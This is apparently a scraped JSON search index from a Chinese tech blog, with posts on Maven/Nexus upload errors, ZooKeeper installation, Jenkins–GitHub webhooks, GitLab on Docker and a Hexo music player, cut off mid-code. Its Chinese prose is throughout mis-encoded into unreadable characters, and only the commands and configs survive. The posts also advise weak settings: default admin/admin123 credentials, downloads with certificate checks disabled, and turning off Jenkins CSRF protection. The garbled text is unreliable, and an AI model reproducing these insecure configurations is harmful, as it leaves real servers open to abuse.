æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼Œä¸€ä¸ªå‘å¸ƒç‰ˆæœ¬ï¼Œä¸€ä¸ªæ˜¯å¿«ç…§ç‰ˆæœ¬ï¼Œè¦å’Œéƒ¨ç½² Jar åŒ…çš„ç‰ˆæœ¬å·å®Œå…¨å¯¹åº” ä¸Šä¼  Jar åŒ…åˆ°ç§æœ‰ä»“åº“å‡ºç° 401 é”™è¯¯ç ä¸€èˆ¬æŠ¥ 401 è¿™ä¸ªé”™è¯¯ç ï¼Œæ˜¯å› ä¸ºæ²¡æœ‰å‘å¸ƒæƒé™ï¼Œè€Œæ²¡å‘å¸ƒæƒé™çš„åŸå› ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯å› ä¸ºå¯†ç é”™äº†å¯¼è‡´ï¼Œæˆ–è€…è´¦å·æœ¬èº«å°±æ²¡æœ‰å‘å¸ƒ Jar åŒ…çš„æƒé™ã€‚å¦‚æœæ˜¯å¯†ç é”™è¯¯ï¼Œåˆ™å¯ä»¥ç¼–è¾‘ Maven çš„ settings.xml é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡æ·»åŠ  server èŠ‚ç‚¹æ¥é…ç½®ç§æœ‰ä»“åº“çš„è´¦å·å’Œå¯†ç ï¼š 1234567891011&lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt;&lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt; å¦‚æœå¯†ç æ­£ç¡®ï¼Œè´¦å·æœ¬èº«ä¹Ÿå…·æœ‰å‘å¸ƒ Jar åŒ…çš„æƒé™ï¼Œä½†ä¾ç„¶æç¤º 401 é”™è¯¯ï¼Œé‚£ä¹ˆæ­¤æ—¶åº”è¯¥æ£€æŸ¥å½“å‰ç”Ÿæ•ˆçš„ settings.xml é…ç½®æ–‡ä»¶æ˜¯å“ªä¸ªï¼ŒæŸ¥è¯¢å‘½ä»¤å¦‚ä¸‹ï¼š 12345$ mvn -X[DEBUG] Reading global settings from /usr/develop/maven-3.6.0/conf/settings.xml[DEBUG] Reading user settings from /root/.m2/settings.xml[DEBUG] Reading global toolchains from /usr/develop/maven-3.6.0/conf/toolchains.xml[DEBUG] Reading user toolchains from /root/.m2/toolchains.xml å¦‚æœä¸Šé¢è¾“å‡ºçš„ global settings æŒ‡å‘çš„é…ç½®æ–‡ä»¶ä¸æ˜¯æ‰€æœŸæœ›çš„ï¼Œæ­¤æ—¶å°±åº”è¯¥æ³¨æ„äº†ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›ä¸€æ­¥æŸ¥çœ‹æ­£åœ¨èµ·ä½œç”¨çš„é‚£ä¸ª settings.xml çš„å†…å®¹ï¼š 1$ mvn help:effective-settings Nexus å¸¸è§é—®é¢˜è§£å†³æŒ‡å®š Nexus ä½¿ç”¨çš„ JDK ç‰ˆæœ¬ Nexus Version Supported Sun/Oracle JRE version 1.9 and earlier 5 or 6 2.0-2.5 6 or 7 2.6.x 7u45+, only 8+ will not work 2.7.x-2.9.x 7u45+, 8+ may work but is not thoroughly tested 2.10.x-2.11.1 7u45+, 8u25+ 2.11.2+ 8u31+ strongly recommended, 7u79+ no further public updates as of April 2015 2.12.0-01 8u31+ strongly recommended, 11.0.9 not work ç”±äºä»¥å‰å®‰è£…çš„ Nexus ç‰ˆæœ¬ä¸º 2.12.0-01ï¼ŒJDK ç‰ˆæœ¬ä¸º 8ï¼Œåæ¥ JDK å‡çº§ä¸º 11 åï¼ŒNexus æ— æ³•å¯åŠ¨ï¼Œå› æ­¤åªèƒ½æŒ‡å®š Nexus é»˜è®¤ä½¿ç”¨ JDK 8ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š 123456789101112131415# è¿›å…¥é…ç½®æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•$ cd nexus/nexus-2.12.0-01/bin/jsw/conf# å¤‡ä»½é…ç½®æ–‡ä»¶$ cp wrapper.conf wrapper.conf.default# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼ŒæŒ‡å®šJDKçš„å®‰è£…è·¯å¾„$ vim wrapper.confwrapper.java.command=/usr/java/jdk1.8.0_102/bin/java# é‡å¯NexusæœåŠ¡$ service nexus restart# æŸ¥çœ‹NexusæœåŠ¡çš„è¿è¡ŒçŠ¶æ€$ service nexus status var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java å¼€å‘éšç¬”"},{title:"Linux å®‰è£… ZooKeeper å•æœºå®ä¾‹",url:"/posts/6edb1958.html",text:'å‰è¨€æœ¬æ–‡é€‚ç”¨äº Centos/Debian/Ubuntu ç­‰ Linux å‘è¡Œç‰ˆç³»ç»Ÿã€‚ å®‰è£… Oracle JDKå®‰è£… Oracle JDK ä¸æ˜¯å¿…éœ€çš„ï¼Œå¦‚æœä¸æƒ³å®‰è£…å¯ä»¥ä½¿ç”¨ Open-JDK æ›¿ä»£ï¼Œè€Œä¸”å¤§å¤šæ•° Linux å‘è¡Œç‰ˆè‡ªå¸¦ Open-JDKã€‚ 1234567891011121314151617181920212223242526272829303132# ä¸‹è½½Oracle JDK8# wget -P /usr/local --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3a%2F%2Fwww.oracle.com%2Ftechnetwork%2Fjava%2Fjavase%2Fdownloads%2Fjdk8-downloads-2133151.html; oraclelicense=accept-securebackup-cookie;" "https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk1.8.0_201-linux-x64.tar.gz"# è§£å‹Oracle JDK8# tar -xvf /usr/local/jdk1.8.0_201-linux-x64.tar.gz# åˆ é™¤å‹ç¼©æ–‡ä»¶# rm /usr/local/jdk1.8.0_201-linux-x64.tar.gz# å¦‚æœå·²å®‰è£…Open-JDKï¼Œåˆ™è¦†ç›–Javaå‘½ä»¤çš„è½¯é“¾æ¥# ln -s -f /usr/local/jdk1.8.0_201/bin/java /usr/bin/java# ln -s -f /usr/local/jdk1.8.0_201/bin/javac /usr/bin/javac# é…ç½®JDKçš„ç¯å¢ƒå˜é‡ï¼Œåœ¨é…ç½®æ–‡ä»¶æœ«å°¾è¿½åŠ ä»¥ä¸‹å†…å®¹å³å¯# vim /etc/profileJAVA_HOME=/usr/local/jdk1.8.0_201JRE_HOME=/usr/local/jdk1.8.0_201/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATH# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile# éªŒè¯ç¯å¢ƒå˜é‡æ˜¯å¦ç”Ÿæ•ˆï¼Œå¦‚æœä¸ç”Ÿæ•ˆå»ºè®®é‡å¯ç³»ç»Ÿ# javac -versionjavac 1.8.0_201# java -versionjava version "1.8.0_201"Java(TM) SE Runtime Environment (build 1.8.0_201-b09)Java HotSpot(TM) 64-Bit Server VM (build 25.201-b09, mixed mode) ä¸‹è½½ ZooKeeper å‹ç¼©åŒ… ZooKeeper å®˜ç½‘ä¸‹è½½ å®‰è£… ZooKeeper12345678910111213141516171819202122232425262728293031323334353637383940# ç§»åŠ¨å‹ç¼©æ–‡ä»¶åˆ°/usr/localç›®å½•# mv zookeeper-3.4.13.tar.gz /usr/local# è§£å‹å‹ç¼©æ–‡ä»¶# cd /usr/local# tar -xvf zookeeper-3.4.13.tar.gz# åˆ é™¤å‹ç¼©æ–‡ä»¶# rm -rf zookeeper-3.4.13.tar.gz# åˆ›å»ºZooKeeperçš„æ•°æ®ç›®å½•ä¸æ—¥å¿—ç›®å½•# mkdir -p /usr/local/zookeeper-3.4.13/data# mkdir -p /usr/local/zookeeper-3.4.13/log# åˆ›å»ºé…ç½®æ–‡ä»¶# cd /usr/local/zookeeper-3.4.13/conf# cp zoo_sample.cfg zoo.cfg# ä¿®æ”¹ZooKeeperçš„é»˜è®¤é…ç½®# vim zoo.cfg# å®šä¹‰çš„åŸºå‡†æ—¶é—´é—´éš”ï¼Œå•ä½ï¼šæ¯«ç§’tickTime=2000# é»˜è®¤ç«¯å£clientPort=2181# æ•°æ®æ–‡ä»¶å¤¹dataDir=/usr/local/zookeeper-3.4.13/data# ä¿®æ”¹ZooKeeperçš„æ—¥å¿—é…ç½®# vim log4j.properties# æ—¥å¿—æ–‡ä»¶å¤¹zookeeper.log.dir=/usr/local/zookeeper-3.4.13/log# é…ç½®ç¯å¢ƒå˜é‡# vim /etc/profileZOOKEEPER_HOME=/usr/local/zookeeper-3.4.13PATH=$PATH:ZOOKEEPER_HOME/binexport ZOOKEEPER_HOME PATH# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile ZooKeeper æœåŠ¡ç®¡ç†1234567891011121314151617# è¿›å…¥ZooKeeperçš„binç›®å½•# cd /usr/local/zookeeper-3.4.13/bin# åœæ­¢æœåŠ¡# ./zkServer.sh stop# åå°å¯åŠ¨æœåŠ¡# ./zkServer.sh start# å‰å°å¯åŠ¨æœåŠ¡# ./zkServer.sh start-foreground# æŸ¥çœ‹æœåŠ¡çš„è¿è¡ŒçŠ¶æ€# ./zkServer.sh status# é‡å¯æœåŠ¡# ./zkServer.sh restart å®¢æˆ·ç«¯è¿æ¥ ZooKeeper æœåŠ¡å™¨123456789101112131415161718192021222324252627282930# è¿›å…¥ZooKeeperçš„binç›®å½•$ cd /usr/local/zookeeper-3.4.13/bin# å®¢æˆ·ç«¯è¿æ¥ZooKeeperæœåŠ¡å™¨ç«¯$ ./zkCli.sh -server 127.0.0.1:2181# åˆ›å»ºèŠ‚ç‚¹[zk: 127.0.0.1:2181(CONNECTED) 1] create -e /test-node 123456# åˆ—å‡ºæ‰€æœ‰æ ¹èŠ‚ç‚¹[zk: 127.0.0.1:2181(CONNECTED) 2] ls /[test-node, zookeeper]# è·å–æŒ‡å®šèŠ‚ç‚¹çš„å€¼[zk: 127.0.0.1:2181(CONNECTED) 3] get /test-node123456cZxid = 0x4ctime = Fri Feb 22 02:27:43 UTC 2019mZxid = 0x4mtime = Fri Feb 22 02:27:43 UTC 2019pZxid = 0x4cversion = 0dataVersion = 0aclVersion = 0ephemeralOwner = 0x1000a766c5e0001dataLength = 6numChildren = 0# æ–­å¼€å®¢æˆ·ç«¯è¿æ¥[zk: 127.0.0.1:2181(CONNECTED) 4] quit var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Jenkins å…¥é—¨æ•™ç¨‹ä¹‹å›› Jenkins ä¸ Git æŒç»­é›†æˆå®æˆ˜",url:"/posts/c7372b8f.html",text:'ä¸Šç¯‡ï¼šJenkins å…¥é—¨æ•™ç¨‹ä¹‹ä¸‰ Jenkins ä¸ SVN æŒç»­é›†æˆå®æˆ˜ Jenkins+GitHub æŒç»­é›†æˆç¯å¢ƒçš„æ­å»ºï¼Œä¸ Jenkins+SVN æŒç»­é›†æˆç¯å¢ƒçš„æ­å»ºå¾ˆç›¸ä¼¼ï¼Œä¸‹é¢åªç®€å•ä»‹ç» Jenkins+GitHub çš„é‡ç‚¹å†…å®¹ï¼Œé¢å¤–çš„æ“ä½œå¯å‚è€ƒä¸Šä¸€ç¯‡æ–‡ç« ã€‚ Jenkins+GitHub æŒç»­é›†æˆç¯å¢ƒæ­å»ºè¦ç‚¹ Jenkins éœ€è¦éƒ¨ç½²åˆ°å¤–ç½‘ä¸Šï¼Œå› ä¸ºå†…ç½‘åœ°å€ GitHub æ˜¯æ— æ³•è®¿é—®åˆ°çš„ï¼Œå¯ä»¥ç§Ÿç”¨é˜¿é‡Œäº‘ç­‰äº‘æœåŠ¡å¹³å° Jenkins æ‰€åœ¨çš„ä¸»æœºä¸Šéœ€è¦å®‰è£… Gitï¼Œé€šè¿‡ Git ç¨‹åºä» GitHub ä¸Š clone ä»£ç  åœ¨ Jenkins å†…éœ€è¦æŒ‡å®š Git ç¨‹åºä½ç½®ï¼Œå’ŒæŒ‡å®š JDKã€Maven çš„ä½ç½®ç±»ä¼¼ åœ¨ GitHub ä¸Šä½¿ç”¨ repository çš„ WebHook æ–¹å¼è¿œç¨‹è§¦å‘ Jenkins æ„å»º åœ¨ Jenkins å†…å…³é—­ â€œé˜²æ­¢è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ â€ Jenkins é…ç½® Git ç¨‹åºçš„ä½ç½® æ„å»ºä»»åŠ¡ä¸­é…ç½® Github ä»“åº“çš„åœ°å€ Jenkins å…³é—­â€ é˜²æ­¢è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ â€ æ‰¾åˆ°â€Manage Jenkinsâ€ -&gt; â€œConfigure Global Securityâ€ -&gt; â€œCSRF Protectionâ€ï¼Œå–æ¶ˆå‹¾é€‰ â€œé˜²æ­¢è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ â€ï¼Œç„¶åä¿å­˜è®¾ç½®ã€‚ Github é…ç½® Webhooks Github é…ç½® Webhooks çš„ç›®çš„æ˜¯å½“ Git å®¢æˆ·ç«¯ Push ä»£ç åˆ° Github ä»“åº“åï¼Œé€šçŸ¥ Jenkins Clone æœ€æ–°çš„ä»£ç åˆ°æœ¬åœ°å¹¶è¿›è¡Œæ„å»ºå‘å¸ƒã€‚å¦‚æœä½¿ç”¨ Gitolite æ­å»º Git æœåŠ¡å™¨ï¼Œå¯ä»¥åœ¨ Git ä»“åº“ç›®å½•ä¸‹çš„ hooks/post-update é’©å­è„šæœ¬ä¸­æ·»åŠ è¿œç¨‹è§¦å‘ Jenkins æ„å»ºçš„ CURL å‘½ä»¤ã€‚ä¸‹é¢å¡«å†™çš„ URL æ˜¯è¿œç¨‹è§¦å‘ Jenkins æ„å»ºçš„è¯·æ±‚åœ°å€ï¼Œå°†â€example.comâ€ æ›¿æ¢ä¸º Jenkins æ‰€åœ¨ä¸»æœºçš„å¤–ç½‘ IP æˆ–è€…åŸŸåï¼Œå‚æ•° token çš„å€¼æ˜¯ API Tokenã€‚å…³äºå¦‚ä½•é…ç½®è¿œç¨‹è§¦å‘ Jenkins æ„å»ºï¼Œè¯¦ç»†æ­¥éª¤å¯å‚è€ƒçœ‹ä¸Šä¸€ç¯‡æ–‡ç« ã€‚å®Œæ•´çš„ URL ç¤ºä¾‹å¦‚ä¸‹ï¼šhttp://example.com/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt éªŒè¯ Github çš„ Webhooks æ˜¯å¦æ­£å¸¸å·¥ä½œ æœ¬åœ°ä¿®æ”¹é¡¹ç›®ä»£ç ï¼Œç„¶å Push åˆ° Github è¿œç¨‹ä»“åº“ï¼Œè§‚å¯Ÿ Jenkins æ„å»ºä»»åŠ¡é¡µé¢å·¦è¾¹çš„å°çª—å£ï¼ˆæ„å»ºå†å²ï¼‰å†…æ˜¯å¦æœ‰æ–°æ„å»ºå†å²å‡ºç°ï¼Œå¦‚æœæœ‰åˆ™è¯´æ˜ Webhooks æ­£å¸¸å·¥ä½œã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ci/cd"},{title:"Git ä¹‹ä¹ - Docker æ­å»º Gitlab æœåŠ¡å™¨",url:"/posts/ec27dc79.html",text:'å‰è¨€ Docker ç¯å¢ƒä¸‹å®˜æ–¹æä¾›ä¸‰ç§æ–¹å¼å®‰è£… Gitlabï¼Œç¬¬ä¸€ç§æ˜¯åŸºäº Docker å¼•æ“å®‰è£…ï¼Œç¬¬äºŒç§æ˜¯é›†ç¾¤ç¯å¢ƒä¸‹å®‰è£…ï¼Œç¬¬ä¸‰ç§æ˜¯é€šè¿‡ Docker-Compose å®‰è£…ã€‚æœ¬æ–‡å°†ä»‹ç»å¦‚ä½•é€šè¿‡ Docker-Compose å®‰è£… Gitlabï¼Œå¦‚æœéœ€è¦ Docker å®˜æ–¹å®‰è£… Gitlab çš„æ•™ç¨‹ï¼Œå¯ç‚¹å‡»è¿™é‡Œã€‚ å®‰è£… Docker ç«™å†…æ•™ç¨‹ï¼šDocker ä¹‹ä¸€ Docker ä»‹ç»ä¸å®‰è£… å®‰è£… Docker-Compose ç«™å†…æ•™ç¨‹ï¼šDocker ä¹‹åä¸ƒ Docker-Compose å®‰è£…ä¸ä½¿ç”¨ Gitlab æ•°æ®å·æŒ‚è½½ä»‹ç» åˆ›å»º Docker-Compose é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨é»˜è®¤ç«¯å£ 1234567891011121314151617181920# åˆ›å»ºç›®å½•# mkidr -p /usr/local/gitlab# åˆ›å»ºdocker-compose.ymlé…ç½®æ–‡ä»¶# vim /usr/local/gitlab/docker-compose.ymlweb: image: \'gitlab/gitlab-ce:latest\' restart: always hostname: \'gitlab.example.com\' environment: GITLAB_OMNIBUS_CONFIG: | external_url \'https://gitlab.example.com\' ports: - \'80:80\' - \'443:443\' - \'22:22\' volumes: - \'/srv/gitlab/config:/etc/gitlab\' - \'/srv/gitlab/logs:/var/log/gitlab\' - \'/srv/gitlab/data:/var/opt/gitlab\' åˆ›å»º Docker-Compose é…ç½®æ–‡ä»¶ï¼Œåœ¨ Docker å®¹å™¨å†…ä½¿ç”¨è‡ªå®šä¹‰ç«¯å£ 12345678910111213141516171819202122# åˆ›å»ºç›®å½•# mkidr -p /usr/local/gitlab# åˆ›å»ºdocker-compose.ymlé…ç½®æ–‡ä»¶ï¼Œåœ¨Dockerå®¹å™¨å†…ä½¿ç”¨è‡ªå®šä¹‰ç«¯å£# æ­¤å¤„é‡ç‚¹æ˜¯åœ¨Dockerå®¹å™¨å†…ä½¿ç”¨è‡ªå®šä¹‰ç«¯å£ï¼Œè€Œéç®€å•ä¿®æ”¹Dockerå®¹å™¨çš„ç«¯å£æ˜ å°„# vim /usr/local/gitlab/docker-compose.ymlweb: image: \'gitlab/gitlab-ce:latest\' restart: always hostname: \'gitlab.example.com\' environment: GITLAB_OMNIBUS_CONFIG: | nginx[\'listen_port\'] = 9090 external_url \'http://gitlab.example.com:9090\' gitlab_rails[\'gitlab_shell_ssh_port\'] = 2224 ports: - \'9090:9090\' - \'2224:2224\' volumes: - \'/srv/gitlab/config:/etc/gitlab\' - \'/srv/gitlab/logs:/var/log/gitlab\' - \'/srv/gitlab/data:/var/opt/gitlab\' Docker-Compose å®‰è£… Gitlab 12345678910111213# è¿›å…¥é…ç½®æ–‡ä»¶docker-compose.ymlæ‰€åœ¨çš„ç›®å½•# cd /usr/local/gitlab# æ‹‰å–æœ€æ–°çš„Gitlabé•œåƒ# docker-compose pull# åˆ›å»ºå¹¶å¯åŠ¨Gitlabå®¹å™¨# docker-compose up -d# æŸ¥çœ‹Gitlabå®¹å™¨çš„è¿è¡Œæƒ…å†µï¼ˆä½¿ç”¨åœ¨Dockerå®¹å™¨å†…æŒ‡å®šè‡ªå®šä¹‰ç«¯å£çš„docker-composeé…ç½®ï¼‰# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES23a12382baff gitlab/gitlab-ce:latest "/assets/wrapper" 4 minutes ago Up 4 minutes (healthy) 22/tcp, 80/tcp, 0.0.0.0:2224-&gt;2224/tcp, 443/tcp, 0.0.0.0:9090-&gt;9090/tcp gitlab_web_1 æµ‹è¯•è®¿é—® Gitlab å¯åŠ¨ Gitlab å®¹å™¨åï¼Œç¨ç­‰ä¸‰å››åˆ†é’Ÿç„¶ååœ¨æµè§ˆå™¨è¾“å…¥ä»¥ä¸‹åœ°å€è®¿é—® Gitlab çš„ Web é¡µé¢ï¼š http://127.0.0.1 æˆ–è€… http://127.0.0.1:9090 å®‰è£…åé…ç½® Gitlab 123456789101112131415161718# è¿›å…¥é…ç½®æ–‡ä»¶docker-compose.ymlæ‰€åœ¨çš„ç›®å½•# cd /usr/local/gitlab# ç¼–è¾‘docker-composeçš„é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ç›¸å…³é…ç½®# vim docker-compose.ymlenvironment: GITLAB_OMNIBUS_CONFIG: | nginx[\'listen_port\'] = 9090 ....ï¼ˆçœç•¥ï¼‰# åœæ­¢Giblabå®¹å™¨# docker-compose stop# åˆ é™¤Giblabå®¹å™¨ï¼ˆæ•°æ®å·çš„æ•°æ®é»˜è®¤ä¸ä¼šè¢«åˆ é™¤ï¼‰# docker-compose down# åˆ›å»ºå¹¶å¯åŠ¨Gitlabå®¹å™¨# docker-compose up -d å®‰è£…åæ›´æ–°ã€å‡çº§ Gitlab 123456789101112131415161718# è¿›å…¥é…ç½®æ–‡ä»¶docker-compose.ymlæ‰€åœ¨çš„ç›®å½•# cd /usr/local/gitlab# åœæ­¢Giblabå®¹å™¨# docker-compose stop# åœ¨é…ç½®æ–‡ä»¶docker-compose.ymlä¸­æŒ‡å®šGitlabæ–°çš„ç‰ˆæœ¬å·ï¼Œæˆ–è€…ç›´æ¥æŒ‡å®šæœ€æ–°çš„ç‰ˆæœ¬ï¼Œå³â€œgitlab/gitlab-ce:latestâ€# vim docker-compose.ymlweb: image: \'gitlab/gitlab-ce:latest\' restart: always ....ï¼ˆçœç•¥ï¼‰# æ‹‰å–æœ€æ–°çš„Gitlabé•œåƒ# docker-compose pull# åˆ›å»ºå¹¶å¯åŠ¨Gitlabå®¹å™¨# docker-compose up -d æ³¨æ„äº‹é¡¹ ä¸ºäº†ä»¥åæ–¹ä¾¿æ›´æ–° Gitlab é•œåƒï¼ŒåŒæ—¶æ›´å¥½åœ°å¤„ç†æ›´æ–°é•œåƒå¸¦æ¥çš„å‘å‰å…¼å®¹é—®é¢˜ï¼Œå»ºè®®é¦–æ¬¡å®‰è£…æˆ–è€…æ›´æ–° Gitlab çš„æ—¶å€™ï¼Œç›´æ¥æŒ‡å®šå…·ä½“éœ€è¦å®‰è£…çš„ç‰ˆæœ¬å·ï¼Œè€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨ latest ç‰ˆæœ¬å·ã€‚Gitlab-CE çš„ç‰ˆæœ¬å·å¯ä»¥ä»è¿™é‡Œè·å–ã€‚ 123456# åœ¨é…ç½®æ–‡ä»¶docker-compose.ymlä¸­æŒ‡å®šGitlabçš„ç‰ˆæœ¬å·# vim /usr/local/gitlab/docker-compose.ymlweb: image: \'gitlab/gitlab-ce:11.7.5-ce.0\' restart: always ....ï¼ˆçœç•¥ï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ– ç‰ˆæœ¬æ§åˆ¶"},{title:"Hexo å…¨å±€æ·»åŠ  APlayer éŸ³ä¹æ’­æ”¾å™¨",url:"/posts/cfdad023.html",text:'ç›¸å…³ç«™ç‚¹ APlayer å®˜ç½‘ APlayer Github Hexo-Tag-Aplayer éŸ³ä¹ç›´é“¾æœç´¢å·¥å…· åŸºäº Yilia ä¸»é¢˜å…¨å±€æ·»åŠ  APlayer éŸ³ä¹æ’­æ”¾å™¨ ç¼–è¾‘ Yilia çš„æ¨¡ç‰ˆæ–‡ä»¶ hexo-theme-yilia/layout/_partial/left-col.ejsï¼Œåœ¨æ–‡ä»¶çš„æœ«å°¾è¿½åŠ ä»¥ä¸‹ä»£ç ï¼Œå…¶ä¸­æ­Œæ›²çš„æ­Œè¯æ–‡ä»¶ã€å°é¢å›¾ç‰‡ã€URL éƒ½å¯ä»¥ä»é€šè¿‡éŸ³ä¹ç›´é“¾æœç´¢å·¥å…·è·å–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æœåŠ¡å™¨æœ¬åœ°èµ„æºæ–‡ä»¶ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœä¸‹é¢çš„ä»£ç ä¸èƒ½å°† APlayer æ’­æ”¾å™¨å›ºå®šåˆ°ç†æƒ³çš„é¡µé¢ä½ç½®ï¼Œå¯è‡ªè¡Œä¿®æ”¹ div æ ‡ç­¾çš„æ ·å¼å’Œ APlayer çš„ fixed å‚æ•°å€¼ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;% if(theme.aplayer.enable) { %&gt;&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css"&gt;// è¿™é‡Œdivçš„æ ·å¼æ˜¯ç¬”è€…è‡ªå·±ä¿®æ”¹è¿‡çš„ï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨APlayerå®˜æ–¹çš„åŸé…ç½®ï¼š&lt;div id="aplayer"&gt;&lt;/div&gt;&lt;div id="aplayer" style="position:absolute;left;0;bottom:0;"&gt;&lt;/div&gt;&lt;script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"&gt;&lt;/script&gt;&lt;script src="https://cdn.jsdelivr.net/npm/color-thief-don@2.0.2/src/color-thief.js"&gt;&lt;/script&gt;&lt;script&gt; const ap = new APlayer({ container: document.getElementById(\'aplayer\'), autoplay: false, //è‡ªåŠ¨æ’­æ”¾ listFolded: true, //æ’­æ”¾åˆ—è¡¨é»˜è®¤æŠ˜å  listMaxHeight: 90, //æ’­æ”¾åˆ—è¡¨æœ€å¤§é«˜åº¦ order: \'list\', //éŸ³é¢‘å¾ªç¯é¡ºåº, å¯é€‰å€¼: \'list\', \'random\' loop: \'all\', //éŸ³é¢‘å¾ªç¯æ’­æ”¾, å¯é€‰å€¼: \'all\', \'one\', \'none\' theme: \'#e9e9e9\', //åˆ‡æ¢éŸ³é¢‘æ—¶çš„ä¸»é¢˜è‰²ï¼Œä¼˜å…ˆçº§ä½äºaudio.theme preload: \'none\', //éŸ³é¢‘é¢„åŠ è½½ï¼Œå¯é€‰å€¼: \'none\', \'metadata\', \'auto\' mutex: true, //äº’æ–¥ï¼Œé˜»æ­¢å¤šä¸ªæ’­æ”¾å™¨åŒæ—¶æ’­æ”¾ï¼Œå½“å‰æ’­æ”¾å™¨æ’­æ”¾æ—¶æš‚åœå…¶ä»–æ’­æ”¾å™¨ lrcType: 3, //æ­Œè¯æ ¼å¼ï¼Œå¯é€‰å€¼ï¼š3ï¼ˆLRCæ–‡ä»¶æ­Œè¯æ ¼å¼ï¼‰ï¼Œ1ï¼ˆJSå­—ç¬¦ä¸²æ­Œè¯æ ¼å¼ï¼‰ volume: 0.7, //é»˜è®¤éŸ³é‡ï¼Œè¯·æ³¨æ„æ’­æ”¾å™¨ä¼šè®°å¿†ç”¨æˆ·è®¾ç½®ï¼Œç”¨æˆ·æ‰‹åŠ¨è®¾ç½®éŸ³é‡åé»˜è®¤éŸ³é‡å³å¤±æ•ˆ fixed: false, //å¸åº•æ¨¡å¼ï¼ˆfixed:trueï¼‰ï¼Œè¿·ä½ æ¨¡å¼ï¼ˆmini:trueï¼‰ï¼Œæ™®é€šæ¨¡å¼ï¼ˆæ³¨é‡Šæ­¤è¡Œæˆ–è€…è®¾ç½®fixed:falseï¼‰ audio: [{ name: \'å¹³å‡¡ä¹‹è·¯\', artist: \'æœ´æ ‘\', lrc: \'/downloads/lrc/å¹³å‡¡ä¹‹è·¯-æœ´æ ‘.lrc\', cover: 